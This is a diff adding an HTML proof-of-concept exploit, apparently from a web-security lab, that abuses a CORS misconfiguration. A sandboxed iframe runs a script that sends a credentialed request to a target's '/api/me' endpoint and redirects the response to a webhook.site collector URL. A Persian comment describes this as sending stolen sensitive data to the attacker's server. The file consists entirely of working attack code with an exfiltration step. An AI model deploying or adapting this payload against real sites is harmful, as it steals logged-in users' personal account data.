@@ -1,0 +1,14 @@
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
+    <script>
+        var req = new XMLHttpRequest();
+        req.onload = reqListener;
+        req.open('GET', 'https://2fc4e1a4f890.pwnbox-lab.com//api/me', true);
+        req.withCredentials = true;
+        req.send();
+
+        function reqListener() {
+            // ارسال اطلاعات حساس سرقت شده به سرور شما
+            location = 'https://webhook.site/f24d94fd-7584-42f3-aa54-e6f6a25e0625/log?data=' + encodeURIComponent(this.responseText);
+        };
+    </script>
+"></iframe>
